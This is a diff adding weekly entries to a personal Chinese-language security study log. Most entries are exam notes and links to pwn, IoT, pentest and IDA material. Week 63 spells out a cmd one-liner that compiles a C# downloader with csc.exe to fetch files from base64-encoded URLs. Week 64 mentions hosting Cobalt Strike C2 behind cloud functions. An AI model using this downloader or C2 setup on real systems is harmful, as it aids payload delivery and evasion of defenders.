@@ -811,4 +811,65 @@
 
 > 备考
 
++ https://xz.aliyun.com/news/16725
+  + pwn
+
+## 第六十一周（2025.2.24-2025.3.2）
+
+> 备考、科目二
+
++ 科目二过了
+
+## 第六十二周（2025.3.3-2025.3.9）
+
+> 备考
+
++ http://game.iotsec-zone.com
+  + iot
++ https://key08.com/index.php/2025/01/24/2337.html
+  + 真正的IDA教程
+
+## 第六十三周（2025.3.10-2025.3.16）
+
+> 备考
+
++ https://mp.weixin.qq.com/s/hyP61MfRbpTjFMMl5MWqJg
++ echo using System; using System.Net; using System.Text; >a.txt & echo class Program { static void Main(string[] a) { >>a.txt & echo try { string url = Encoding.UTF8.GetString(Convert.FromBase64String(a[0])); >>a.txt & echo new WebClient().DownloadFile(url, a[1]); Console.Write("1"); } catch { } } } >>a.txt
+  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /target:exe /out:C:\download.exe a.txt
+  usage:download.exe base64edurl outpath
+
+## 第六十四周（2025.3.17-2025.3.23）
+
+> 备考
+
++ https://xz.aliyun.com/news/17265
+  + app渗透
++ 云函数与cs，因为我的免费域名炸了，后面考虑用云函数上线cs
+  + https://mp.weixin.qq.com/s/6hEOo8Y-Htx6Xp6tpHKALw
+  + https://mp.weixin.qq.com/s/KKq7Fd1ti_6siAn3FTmrmQ
+
+## 第六十五周（2025.3.24-2025.3.30）
+
+> 考试顺利
+
 + 
+
+## 第六十六周（2025.3.31-2025.4.6）
+
+> 
+
++ 
+
+## 第六十七周（2025.4.7-2025.4.13）
+
+> 
+
++ 
+
+## 第六十八周（2025.4.14-2025.4.20）
+
+> 
+
++ 
+
+## 第六十九周（2025.4.21-2025.4.27）
